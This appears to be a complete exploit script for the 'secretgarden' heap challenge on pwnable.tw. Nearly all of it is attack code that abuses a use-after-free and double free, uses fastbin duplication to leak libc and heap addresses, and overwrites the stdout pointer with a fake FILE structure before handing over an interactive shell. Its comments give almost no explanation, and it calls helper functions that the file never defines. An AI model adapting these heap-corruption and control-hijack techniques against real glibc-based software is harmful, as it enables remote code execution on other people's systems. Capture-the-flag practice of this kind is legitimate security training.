#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *
exe = context.binary = ELF('./secretgarden')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10203)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *main
continue
'''.format(**locals())

# -- Exploit goes here --
def choose(option):
    io.sendlineafter("Your choice : ", str(option))

def create(size, name, color):
    choose(1)
    io.sendlineafter("Length of the name :", str(size))
    io.sendlineafter("The name of flower :", name)
    io.sendlineafter("The color of the flower :", color)

def delete(idx):
    choose(3)
    io.sendlineafter("Which flower do you want to remove from the garden:", str(idx))

"""
Bug : UAF and double free
idk how i got the leaks 0_o. just tried some add and delete and got leaks.
overwrote stdout pointer to heap where i stored the fake stdout structure
fastbin dup
"""


libc = ELF(exe.libc.path)
io = start()
create(0x410, "", "a"*8)
create(0x410, "", "a"*8)
create(0x21-8, "", "A"*8)
delete(0)
delete(1)

create(0x60, "", "A"*8)
create(0x60, "", "A"*8)
create(0x60, "", "B"*8)
choose(2)
io.recvuntil("Name of the flower[3] :\n")
libc_leak = io.recvline().strip()
libc_leak = b'\x00' + libc_leak
libc_leak = u64(libc_leak.ljust(8, b'\x00'))
libc.address = libc_leak - 0x3c3b00

create(0x421-8, fake_stdout(libc.address + 0xcc543), "a"*8)
create(0x241-8, "", "a"*8)

create(113, "", "a"*8)
create(113, "", "a"*8)
delete(8)
delete(9)
delete(8)
delete(0)
choose(2)
io.recvuntil("Name of the flower[7] :")
heap_leak = u64_line()
heap_base = heap_leak - 0x13f0
log.info(f"heap base : {hex(heap_base)}")
log.info(f"libc base : {hex(libc.address)}")
fake_stdout = heap_base + 0x1920
fake_fast = libc.address + 0x3c44fd # near io list all
fake_fast_1 = libc.address + 0x3c46bd # near stdout
create(0x61, p64(heap_base + 0x147f), "a")
create(0x68, "", "A")
create(0x68, "", "p")
delete(12)
delete(11)
delete(12)
create(0x68, p64(fake_fast_1), "A")
create(0x68, p64(0xdeadbeef), "A")
create(0x68, p64(0xdeadbeef), "A")
io.sendlineafter("Your choice : ", "1")
io.sendlineafter("Length of the name :", str(0x68))
io.sendlineafter("The name of flower :", b"\x00"*59 + p64(fake_stdout))
io.interactive()
